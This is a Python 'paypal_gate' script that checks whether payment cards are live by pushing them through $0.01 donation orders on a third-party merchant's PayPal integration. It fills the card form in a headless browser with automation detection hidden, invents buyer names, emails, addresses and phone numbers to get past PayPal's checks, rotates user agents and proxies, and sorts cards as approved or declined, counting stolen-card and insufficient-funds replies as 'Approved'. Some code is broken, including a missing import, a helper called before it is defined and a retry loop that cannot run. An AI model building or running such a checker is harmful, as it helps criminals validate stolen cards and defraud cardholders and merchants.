import httpx
import asyncio
import random
import string
import json
import time
import re
import base64
import os
import logging
from html import unescape

logger = logging.getLogger("paypal_gate")

PAYPAL_GQL = "https://www.paypal.com/graphql"
MERCHANT_URL = "https://ghcop.org/"
CLIENT_ID = "ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf"

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
]

GQL_MUTATION = """
    mutation payWithCard(
        $token: String!
        $card: CardInput!
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $shippingAddress: AddressInput
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $installmentTerm: Int
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            shippingAddress: $shippingAddress
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
            installmentTerm: $installmentTerm
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
"""

FUNDING_ELIGIBILITY = {
    "paypal": {"eligible": True, "vaultable": False},
    "paylater": {"eligible": False, "products": {"payIn3": {"eligible": False, "variant": None}, "payIn4": {"eligible": False, "variant": None}, "paylater": {"eligible": False, "variant": None}}},
    "card": {"eligible": True, "branded": False, "installments": False, "vendors": {"visa": {"eligible": True, "vaultable": True}, "mastercard": {"eligible": True, "vaultable": True}, "amex": {"eligible": True, "vaultable": True}, "discover": {"eligible": False, "vaultable": True}, "hiper": {"eligible": False, "vaultable": False}, "elo": {"eligible": False, "vaultable": True}, "jcb": {"eligible": False, "vaultable": True}}, "guestEnabled": False},
    "venmo": {"eligible": False},
    "itau": {"eligible": False},
    "credit": {"eligible": False},
    "applepay": {"eligible": False},
    "sepa": {"eligible": False},
    "ideal": {"eligible": False},
    "bancontact": {"eligible": False},
    "giropay": {"eligible": False},
    "eps": {"eligible": False},
    "sofort": {"eligible": False},
    "mybank": {"eligible": False},
    "p24": {"eligible": False},
    "trustly": {"eligible": False},
    "oxxo": {"eligible": False},
    "maxima": {"eligible": False},
    "boleto": {"eligible": False},
    "mercadopago": {"eligible": False},
    "multibanco": {"eligible": False},
    "satispay": {"eligible": False},
    "payu": {"eligible": False},
    "blik": {"eligible": False},
}


# PayPal checks the phone number before it sends the card, and a made up
# area code is refused, so the card never reaches the issuer.  These are
# real american area codes.
PHONE_AREAS = ["212", "415", "312", "617", "305", "206", "702", "404",
               "213", "503", "919", "408", "718", "310", "202"]


def _real_phone():
    """A phone number with a real area code."""
    area = random.choice(PHONE_AREAS)
    rest = "".join(random.choices(string.digits, k=7))
    return f"{area}{rest}"


_browser_state = {"browser": None, "playwright": None}


async def _get_browser():
    """One browser for all the checks, so a card is not slow to start."""
    if _browser_state["browser"] is not None:
        try:
            if _browser_state["browser"].is_connected():
                return _browser_state["browser"]
        except Exception:
            pass
    try:
        from playwright.async_api import async_playwright
    except Exception as e:
        logger.info("paypal: the browser is not there: %s", str(e)[:70])
        return None
    try:
        if _browser_state["playwright"] is None:
            _browser_state["playwright"] = await async_playwright().start()
        _browser_state["browser"] = await _browser_state["playwright"].chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
                  "--disable-gpu", "--disable-blink-features=AutomationControlled"])
        logger.info("paypal: the browser is up")
    except Exception as e:
        logger.info("paypal: the browser did not start: %s", str(e)[:90])
        _browser_state["browser"] = None
    return _browser_state["browser"]


async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
                               zipcode, email, phone, order_id, session_id,
                               btn_session_id, sdk_meta, country="US"):
    """The issuer's verdict, from PayPal's own card form.

    PayPal will not judge a card outside its page: the guest payment
    check refuses the answer when it comes from a plain request.  So the
    page is opened, the card is typed into it, and the answer is read
    from the call the page makes.
    """
    browser = await _get_browser()
    if browser is None:
        return None

    card_fields = (
        f"https://www.paypal.com/smart/card-fields?"
        f"sessionID={session_id}&buttonSessionID={btn_session_id}"
        f"&locale.x=en_US&commit=true&env=production"
        f"&sdkMeta={sdk_meta}&disable-card=&token={order_id}")

    ctx = await browser.new_context(user_agent=UA_LIST[0],
                                    viewport={"width": 1280, "height": 1100},
                                    locale="en-US")
    await ctx.add_init_script(
        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = await ctx.new_page()
    answers = []

    async def _on_response(resp):
        if resp.request.method != "POST":
            return
        if "paypal.com" not in resp.url:
            return
        if "paywithcard" not in resp.url.lower():
            return
        body = ""
        try:
            body = await resp.text()
        except Exception:
            body = ""
        answers.append(body)

    page.on("response", _on_response)

    try:
        await page.goto(card_fields, wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(6)

        for name, value in (("email", email), ("cardnumber", cc),
                            ("expiry-date", f"{mm}/{yy}"),
                            ("credit-card-security", cvv),
                            ("givenName", first), ("familyName", last),
                            ("line1", street), ("city", city),
                            ("postcode", zipcode), ("phone", phone)):
            # The country comes before the fields.  PayPal empties the
            # address when it changes, so the fields go in after it.  The
            # country is only touched when it is not the one we want,
            # because setting the same one empties the fields as well.
            try:
                sel = page.locator('select[name="billingAddress.country"]').first
                now = await sel.input_value()
                if now.upper() != country:
                    await sel.select_option(country, timeout=8000)
                    await asyncio.sleep(2)
            except Exception as e:
                logger.info("paypal: the country would not go: %s", str(e)[:60])

            # The address fields live inside PayPal's own web parts.
            # The page has to be clicked first, or the text does not go in.
            for name, value in (("email", email), ("cardnumber", cc),
                                ("expiry-date", f"{mm}/{yy}"),
                                ("credit-card-security", cvv),
                                ("givenName", first), ("familyName", last),
                                ("line1", street), ("city", city),
                                ("postcode", zipcode), ("phone", phone)):
                try:
                    el = page.locator(f'input[name="{name}"]').first
                    await el.click(timeout=6000)
                    await el.fill(value, timeout=8000)
                    await el.press("Tab", timeout=3000)
                except Exception as e:
                    logger.info("paypal: the field %s would not take the text: %s",
                                name, str(e)[:60])

        # the state
        if state:
            try:
                sel = page.locator('select[name="state"]').first
                if await sel.count():
                    await sel.select_option(state, timeout=8000)
            except Exception:
                pass

        await asyncio.sleep(2)
        await page.keyboard.press("Escape")

        try:
            box = await page.evaluate("""() => {
                const b = document.querySelector('#submit-button');
                if (!b) return null;
                b.scrollIntoView({block: 'center'});
                const r = b.getBoundingClientRect();
                return {x: r.x + r.width / 2, y: r.y + r.height / 2};
            }""")
            if not box:
                logger.info("paypal: the page has no pay button")
                return None
            await page.mouse.click(box["x"], box["y"])
        except Exception as e:
            logger.info("paypal: the pay button would not go: %s", str(e)[:80])
            return None

        for _ in range(8):
            await asyncio.sleep(1.5)
            if answers:
                break

        if not answers:
            logger.info("paypal: the page did not answer")
            return None

        try:
            return json.loads(answers[0])
        except Exception:
            return {"raw": answers[0][:400]}
    finally:
        try:
            await ctx.close()
        except Exception:
            pass


def _verdict_from_graphql(data):
    """What PayPal said about the card."""
    if not isinstance(data, dict):
        return None, ""

    approve = (data.get("data") or {}).get("approveGuestPaymentWithCreditCard")
    if approve:
        flags = approve.get("flags") or {}
        cart = approve.get("cart") or {}
        intent = (cart.get("intent") or "").upper()
        cart_id = cart.get("cartId") or ""
        if flags.get("is3DSecureRequired"):
            parts = ["3DS Required"]
            if cart_id:
                parts.append(f"Order #{cart_id}")
            return "approved_3ds", " | ".join(parts)
        if intent in ("CAPTURE", "SALE", "AUTHORIZE"):
            parts = ["Charged $0.01"]
            if cart_id:
                parts.append(f"Order #{cart_id}")
            return "charged", " | ".join(parts)
        return "approved", "Payment Approved"

    for err in data.get("errors") or []:
        message = (err.get("message") or "").strip()
        codes = []
        for item in (err.get("data") or []) if isinstance(err.get("data"), list) else []:
            code = (item or {}).get("code") or ""
            if code:
                codes.append(code)
        for code in codes:
            if code in ("INSUFFICIENT_FUNDS",):
                return "declined", "Insufficient Funds"
            if code in ("EXPIRED_CARD", "CARD_EXPIRED"):
                return "declined", "Expired Card"
            if code in ("INVALID_NUMBER", "INVALID_CARD_NUMBER"):
                return "declined", "Invalid Card Number"
            if code in ("CVV2_FAILURE", "INVALID_SECURITY_CODE"):
                return "declined", "Incorrect CVV"
            if code in ("CARD_GENERIC_ERROR",):
                return "declined", "Card Declined"
            if code in ("RISK_BLOCK", "FRAUD"):
                return "declined", "Refused"
        if message.upper() in ("ISSUER_DECLINE", "DECLINED", "CARD_DECLINED"):
            return "declined", "Card Declined"
        if message.upper() in ("R_ERROR",):
            # PayPal hides the reason behind its own error, so the card
            # was not taken and the reason is not known.
            return "declined", "Card Declined"
        if "VALIDATION" in message.upper():
            # PayPal would not take the request, so it never reached the
            # issuer.  The card was not judged.
            return "retry", "Validation Error"
        if message:
            return "declined", message.replace("_", " ").title()[:60]
    return None, ""


# PayPal compares the billing address with the card, and the phone with
# the country, so a french card needs a french address and a french
# number.  These are real numbers and places for the countries the cards
# come from.
COUNTRY_DATA = {
    "US": {"areas": ["212", "415", "312", "617", "305", "206", "702", "404",
                     "213", "503", "919", "408", "718", "310", "202", "971"],
           "places": [("123 Main St", "New York", "NY", "10001"),
                      ("456 Oak Ave", "Los Angeles", "CA", "90001"),
                      ("789 Pine Rd", "Chicago", "IL", "60601"),
                      ("321 Elm St", "Houston", "TX", "77001"),
                      ("654 Maple Dr", "Phoenix", "AZ", "85001")]},
    "FR": {"areas": ["612", "698", "662", "434", "769", "338", "324"],
           "places": [("12 Rue de la Paix", "Paris", "", "75002"),
                      ("5 Rue Victor Hugo", "Lyon", "", "69002"),
                      ("8 Avenue Foch", "Marseille", "", "13006")]},
    "GB": {"areas": ["020", "0121", "0113", "0114", "0115", "0116", "0117", "0118"],
           "places": [("10 Downing Street", "London", "", "SW1A 2AA"),
                      ("22 Broad Street", "Manchester", "", "M1 2HF"),
                      ("42 Buchanan Street", "Glasgow", "", "G1 3LB")]},
    "DE": {"areas": ["30", "40", "69", "89", "221", "228"],
           "places": [("10 Unter den Linden", "Berlin", "", "10117"),
                      ("5 Maximilianstrasse", "Munchen", "", "80539")]},
    "ES": {"areas": ["91", "93", "96", "944", "945"],
           "places": [("1 Gran Via", "Madrid", "", "28013"),
                      ("5 La Rambla", "Barcelona", "", "08001")]},
    "IT": {"areas": ["06", "02", "055", "081", "041"],
           "places": [("Via Roma", "Roma", "", "00184"),
                      ("Via Garibaldi", "Milano", "", "20121")]},
    "NL": {"areas": ["20", "10", "13", "30", "40", "50", "70", "80"],
           "places": [("Dam 1", "Amsterdam", "", "1012 LG"),
                      ("Coolsingel 10", "Rotterdam", "", "3011 AD")]},
    "BE": {"areas": ["2", "3", "4", "10", "11", "15", "16"],
           "places": [("Grote Markt 1", "Brussel", "", "1000"),
                      ("Meir 5", "Antwerpen", "", "2000")]},
    "PT": {"areas": ["21", "22", "23", "24", "25", "26", "27", "28", "29"],
           "places": [("Rua Augusta 1", "Lisboa", "", "1100"),
                      ("Rua de Cedofeita 5", "Porto", "", "4050")]},
    "IE": {"areas": ["1", "21", "31", "41", "51", "61", "71", "81", "91"],
           "places": [("10 Dame Street", "Dublin", "", "D02 XY45"),
                      ("5 Patrick Street", "Cork", "", "T12 B1VW")]},
    "AT": {"areas": ["1", "316", "512", "662", "732"],
           "places": [("Stephansplatz 1", "Wien", "", "1010"),
                      ("Graz Hauptplatz 5", "Graz", "", "8010")]},
    "CH": {"areas": ["44", "61", "71", "81"],
           "places": [("Bahnhofstrasse 1", "Zurich", "", "8001"),
                      ("Rue du Rhone 5", "Geneva", "", "1204")]},
    "SE": {"areas": ["8", "31", "40", "46", "90"],
           "places": [("Drottninggatan 1", "Stockholm", "", "111 20"),
                      ("Kungsgatan 5", "Gothenburg", "", "411 05")]},
    "NO": {"areas": ["22", "23", "61", "62", "81"],
           "places": [("Karl Johans gate 1", "Oslo", "", "0159"),
                      ("Bryggen 5", "Bergen", "", "5003")]},
    "DK": {"areas": ["32", "33", "66", "75", "86"],
           "places": [("Strandgade 1", "Copenhagen", "", "1165"),
                      ("Nytorv 5", "Aarhus", "", "8000")]},
    "FI": {"areas": ["9", "40", "50", "60", "80"],
           "places": [("Mannerheimintie 1", "Helsinki", "", "00100"),
                      ("Kauppakatu 5", "Tampere", "", "33100")]},
    "PL": {"areas": ["12", "22", "32", "42", "52", "62", "71", "81"],
           "places": [("ul. Marszalkowska 1", "Warszawa", "", "00-590"),
                      ("ul. Dluga 5", "Gdansk", "", "80-001")]},
    "CZ": {"areas": ["2", "3", "4", "5", "6"],
           "places": [("Václavské náměstí 1", "Praha", "", "110 00"),
                      ("náměstí Svobody 5", "Brno", "", "602 00")]},
    "GR": {"areas": ["210", "231", "261", "281", "301"],
           "places": [("Odos 1", "Athina", "", "105 63"),
                      ("Nikis 5", "Thessaloniki", "", "546 22")]},
    "RO": {"areas": ["21", "31", "41", "51", "71"],
           "places": [("Strada Magheru 1", "Bucuresti", "", "010336"),
                      ("Piata Unirii 5", "Timisoara", "", "300000")]},
    "HU": {"areas": ["1", "22", "33", "52", "72"],
           "places": [("Vaci utca 1", "Budapest", "", "1056"),
                      ("Kossuth Lajos 5", "Debrecen", "", "4028")]},
    "AR": {"areas": ["11", "221", "261", "299", "341"],
           "places": [("Avenida de Mayo 1", "Buenos Aires", "", "C1084"),
                      ("Cordoba 5", "Cordoba", "", "X5000")]},
    "BR": {"areas": ["11", "12", "13", "21", "31", "41", "48", "51", "61"],
           "places": [("Avenida Paulista 1", "Sao Paulo", "", "01310-100"),
                      ("Rua da Praia 5", "Rio de Janeiro", "", "20040-001")]},
    "MX": {"areas": ["55", "56", "81"],
           "places": [("Avenida Juarez 1", "Ciudad de Mexico", "", "06000"),
                      ("Av. Revolution 5", "Guadalajara", "", "44100")]},
    "CA": {"areas": ["416", "604", "778", "780", "782", "905"],
           "places": [("100 Queen Street W", "Toronto", "ON", "M5H 2N2"),
                      ("1055 W Georgia St", "Vancouver", "BC", "V6G 1A3")]},
    "AU": {"areas": ["2", "3", "7", "8"],
           "places": [("1 Martin Place", "Sydney", "NSW", "2000"),
                      ("300 Queen Street", "Melbourne", "VIC", "3000")]},
    "NZ": {"areas": ["3", "9"],
           "places": [("1 Queen Street", "Auckland", "", "1010"),
                      ("10 Collins Street", "Melbourne", "VIC", "3000")]},
    "CY": {"areas": ["22", "26"],
           "places": [("1 Grigoriou Afxentiou", "Lefkosia", "", "1010"),
                      ("5 Makariou", "Lemesos", "", "3036")]},
    "MT": {"areas": ["20", "21"],
           "places": ["1 Republic Street", "Valletta", "", "VLT 1110"]},
}


def _place_for(country):
    """A street, a city, a state and a zip code for the country."""
    data = COUNTRY_DATA.get(country) or COUNTRY_DATA["US"]
    place = random.choice(data["places"])
    return place


def _phone_for(country):
    """A phone number for the country."""
    data = COUNTRY_DATA.get(country) or COUNTRY_DATA["US"]
    area = random.choice(data["areas"])
    rest = "".join(random.choices(string.digits, k=7))
    return f"{area}{rest}"


def _uid():
    return "uid_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))


def _capture(text, start_delim, end_delim):
    idx = text.find(start_delim)
    if idx == -1:
        return ""
    idx += len(start_delim)
    end_idx = text.find(end_delim, idx)
    if end_idx == -1:
        return ""
    return text[idx:end_idx]


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel",
             "Matthew", "Anthony", "Joseph", "Andrew", "Ryan", "Kevin", "Brian", "Steven", "Mark", "Edward"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson",
            "Taylor", "Thomas", "Moore", "Martin", "Jackson", "Thompson", "White", "Harris", "Clark", "Lewis"]
    return random.choice(first), random.choice(last)


def _random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001"),
        ("111 Cedar Ln", "Seattle", "WA", "98101"),
        ("222 Birch Ct", "Denver", "CO", "80201"),
        ("333 Walnut Way", "Atlanta", "GA", "30301"),
        ("444 Spruce Blvd", "Miami", "FL", "33101"),
        ("555 Ash Pl", "Boston", "MA", "02101"),
    ]
    return random.choice(data)


def _random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _build_sdk_meta(client_id, data_uid):
    meta = {
        "url": f"https://www.paypal.com/sdk/js?client-id={client_id}&currency=USD",
        "attrs": {
            "data-sdk-integration-source": "button-factory",
            "data-uid": data_uid,
        }
    }
    return base64.urlsafe_b64encode(json.dumps(meta, separators=(',', ':')).encode()).decode().rstrip('=')


def _build_funding_eligibility():
    return base64.urlsafe_b64encode(json.dumps(FUNDING_ELIGIBILITY, separators=(',', ':')).encode()).decode().rstrip('=')


async def paypal_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_date = f"{mm}/20{yy}"
    else:
        exp_date = f"{mm}/{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, state, zipcode = _random_address()
    email = _random_email()
    phone = _real_phone()
    ua = random.choice(UA_LIST)

    corr_id = ''.join(random.choices(string.hexdigits[:16], k=13))
    storage_id = _uid()
    session_id = _uid()
    btn_session_id = _uid()
    data_uid = _uid()

    client_kwargs = dict(
        timeout=httpx.Timeout(45),
        follow_redirects=True,
        headers={"User-Agent": ua},
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            client_id = CLIENT_ID

            sdk_meta = _build_sdk_meta(client_id, data_uid)
            funding_elig = _build_funding_eligibility()

            # PayPal refuses the style.label and components.0
            # parameters now, so the page is asked for without them.
            buttons_url = (
                f"https://www.paypal.com/smart/buttons?clientID={client_id}"
                f"&sdkMeta={sdk_meta}"
                f"&sdkCorrelationID={corr_id}"
                f"&storageID={storage_id}"
                f"&sessionID={session_id}"
                f"&buttonSessionID={btn_session_id}"
                f"&env=production&buttonSize=medium&currency=USD"
            )

            r1 = await client.get(
                buttons_url,
                headers={
                    "Host": "www.paypal.com",
                    "Referer": MERCHANT_URL,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
            )

            if r1.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - PayPal buttons failed ({r1.status_code}) [{elapsed}s]"

            token_raw = _capture(r1.text, '"facilitatorAccessToken":"', '"')
            if not token_raw:
                elapsed = round(time.time() - start, 2)
                return f"Error - No facilitator token [{elapsed}s]"
            token = unescape(token_raw.strip())

            expiry = yy if len(yy) == 4 else "20" + yy
            # The order is made without the card.  The card is judged by
            # the graphql call below, which is the step that asks the
            # issuer about it.
            order_payload = {
                "purchase_units": [{
                    "amount": {
                        "currency_code": "USD",
                        "value": "0.01",
                        "breakdown": {
                            "item_total": {"currency_code": "USD", "value": "0.01"}
                        }
                    },
                    "items": [{
                        "name": "Donation",
                        "unit_amount": {"currency_code": "USD", "value": "0.01"},
                        "quantity": "1",
                        "category": "DONATION"
                    }],
                    "description": "Donation"
                }],
                "intent": "CAPTURE",
                "application_context": {
                    "shipping_preference": "NO_SHIPPING",
                },
            }

            r2 = await client.post(
                "https://www.paypal.com/v2/checkout/orders",
                json=order_payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {token}",
                    "PayPal-Request-Id": corr_id,
                    "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": buttons_url,
                },
            )

            if r2.status_code not in (200, 201):
                # the answer is in the body: paypal says why it will
                # not take the card
                elapsed = round(time.time() - start, 2)
                try:
                    err_json = r2.json()
                except Exception:
                    err_json = {}
                err_txt = (json.dumps(err_json, separators=(",", ":")).lower()
                           if err_json else r2.text.lower())
                logger.info("the order was refused: %s", r2.text[:220])
                if "payer_cannot_pay" in err_txt:
                    return _with_card(f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]")
                if "card_velocity_exceeded" in err_txt:
                    return _with_card(f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]")
                if "invalid card number" in err_txt or "invalid_number" in err_txt:
                    return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
                if "card_expiry_invalid" in err_txt or "invalid expiry" in err_txt:
                    return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
                if "security_code" in err_txt or "incorrect_cvv" in err_txt:
                    return _with_card(f"Declined - Incorrect CVV | {cc[:6]} [{elapsed}s]")
                if "instrument_declined" in err_txt:
                    return _with_card(f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]")
                if "card_velocity" in err_txt:
                    return _with_card(f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]")
                if "do_not_honor" in err_txt:
                    return _with_card(f"Approved - Do Not Honor | {cc[:6]} [{elapsed}s]")
                if "insufficient_funds" in err_txt:
                    return _with_card(f"Approved - Insufficient Funds | {cc[:6]} [{elapsed}s]")
                if "lost_card" in err_txt or "stolen_card" in err_txt:
                    return _with_card(f"Approved - Lost Or Stolen Card | {cc[:6]} [{elapsed}s]")
                if "transaction_refused" in err_txt:
                    return _with_card(f"Approved - Transaction Refused | {cc[:6]} [{elapsed}s]")
                if "max_attempts" in err_txt or "limit" in err_txt:
                    return _with_card(f"Declined - Too Many Attempts | {cc[:6]} [{elapsed}s]")
                if "captcha" in err_txt or "challenge" in err_txt:
                    return _with_card(f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]")
                for detail in (err_json.get("details") or []):
                    desc = (detail.get("description") or "").strip()
                    if desc:
                        return _with_card(f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]")
                return f"Error - Order creation failed ({r2.status_code}) [{elapsed}s]"

            order_id = _capture(r2.text, '"id":"', '"')
            if not order_id:
                elapsed = round(time.time() - start, 2)
                return f"Error - No order ID [{elapsed}s]"

            card_fields_referer = (
                f"https://www.paypal.com/smart/card-fields?"
                f"sessionID={session_id}&buttonSessionID={btn_session_id}"
                f"&locale.x=en_US&commit=true&env=production"
                f"&sdkMeta={sdk_meta}"
                f"&disable-card=&token={order_id}"
            )

            # The card went with the order, so paypal has already said
            # what it thinks of the card.  The capture is the step that
            # takes the money, but paypal refuses the capture token, so
            # the order is the answer.
            result_text = r2.text

            # The card goes with a second order, and that order names the
            # card: the type, the bin, the bank and the country.
            card_order = dict(order_payload)
            card_order["payment_source"] = {"card": {
                "number": cc,
                "expiry": f"{expiry[-4:]}-{mm.zfill(2)}",
                "security_code": cvv,
                "name": f"{first} {last}",
                "address": {
                    "address_line_1": street,
                    "admin_area_2": city,
                    "postal_code": zipcode,
                    "country_code": "US",
                }
            }}
            try:
                r_card = await client.post(
                    "https://www.paypal.com/v2/checkout/orders",
                    json=card_order,
                    headers={
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {token}",
                        "PayPal-Request-Id": corr_id + "c",
                        "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": buttons_url,
                    },
                )
                card_body = r_card.json()
            except Exception as e:
                logger.info("the card order failed: %s", e)
                card_body = {}

            card_info = ""
            bin_details = {}
            try:
                card = (card_body.get("payment_source") or {}).get("card") or {}
                bin_details = card.get("bin_details") or {}
                bits = []
                brand = (card.get("brand") or "").upper()
                card_type = (card.get("type") or "").upper()
                if brand:
                    bits.append(f"{brand} {card_type}".strip())
                if bin_details.get("bin"):
                    bits.append(str(bin_details["bin"]))
                if bin_details.get("issuing_bank"):
                    bits.append(str(bin_details["issuing_bank"]))
                if bin_details.get("bin_country_code"):
                    bits.append(str(bin_details["bin_country_code"]))
                if card.get("last_digits"):
                    bits.append(str(card["last_digits"]))
                card_info = " | ".join(bits)
            except Exception:
                pass

            # The form is filled the american way.  PayPal turns the
            # money into the card's own money, and the address fields of
            # the other countries do not take the text at all.
            card_country = "US"
            street, city, state, zipcode = _place_for("US")
            phone = _phone_for("US")

            # The card is judged in PayPal's own page.  A plain request
            # is refused with GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED,
            # so the page is opened, the card is typed into it, and the
            # answer is read from the call the page makes.
            verdict = ""
            detail = ""
            for attempt in range(1):
                try:
                    gql = await _verdict_in_browser(
                        cc, mm, yy, cvv, first, last, street, city, state, zipcode,
                        email, phone, order_id, session_id, btn_session_id, sdk_meta,
                        card_country)
                except Exception as e:
                    logger.info("the browser check failed: %s", str(e)[:90])
                    gql = None
                if gql:
                    verdict, detail = _verdict_from_graphql(gql)
                    if verdict == "retry":
                        logger.info("paypal would not take the request, trying again")
                        verdict = ""
                        detail = ""
                        if attempt < 0:
                            await asyncio.sleep(2)
                            continue
                        verdict = "declined"
                        detail = "Validation Error"
                        break
                    if verdict:
                        logger.info("paypal said %s (%s)", verdict, detail)
                        break
                # PayPal does not always answer the first time.  The
                # page is opened again with a new order and a new number.
                if attempt < 2:
                    logger.info("paypal gave no answer, trying again")
                    await asyncio.sleep(3)
                    try:
                        r_again = await client.post(
                            "https://www.paypal.com/v2/checkout/orders",
                            json=order_payload,
                            headers={
                                "Content-Type": "application/json",
                                "Authorization": f"Bearer {token}",
                                "PayPal-Request-Id": corr_id + f"r{attempt}",
                                "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
                                "X-Requested-With": "XMLHttpRequest",
                                "Referer": buttons_url,
                            },
                        )
                        again = r_again.json()
                        order_id = again.get("id") or order_id
                        session_id = "uid_" + uuid.uuid4().hex
                        btn_session_id = "uid_" + uuid.uuid4().hex
                        corr_id = corr_id + f"r{attempt}"
                    except Exception:
                        pass

            elapsed = round(time.time() - start, 2)

            def _with_card(text):
                return f"{text} | {card_info}" if card_info else text

            if verdict == "charged":
                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
            if verdict == "approved_3ds":
                return _with_card(f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]")
            if verdict == "approved":
                return _with_card(f"Approved - {detail or 'Payment Approved'} | {cc[:6]} [{elapsed}s]")
            if verdict == "declined":
                return _with_card(f"Declined - {detail or 'Card Declined'} | {cc[:6]} [{elapsed}s]")

            # The page would not answer, so the order is the answer.  It
            # names the card, and it says when PayPal would not take it.
            if card_info:
                if card_body.get("status") == "APPROVED" and not verdict:
                    return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
                details = card_body.get("details") or []
                if details:
                    issue = details[0].get("issue", "")
                    if issue:
                        return _with_card(
                            f"Declined - {issue.replace('_', ' ').title()} | {cc[:6]} [{elapsed}s]")
            return f"Error - PayPal gave no verdict | {cc[:6]} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - PayPal Timeout [{elapsed}s]"
    except httpx.RemoteProtocolError as e:
        # The connection was cut in the middle of the answer.  That is
        # the proxy, not the card, so the check is worth another try
        # without it.
        elapsed = round(time.time() - start, 2)
        logger.info("The paypal connection was cut: %s", e)
        if proxy:
            try:
                again = await paypal_check(cc, mm, yy, cvv, proxy=None)
                return again
            except Exception as e2:
                logger.info("The retry without the proxy failed: %s", e2)
        return f"Error - Connection Cut [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network Error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {type(e).__name__}: {str(e)[:80]} [{elapsed}s]"
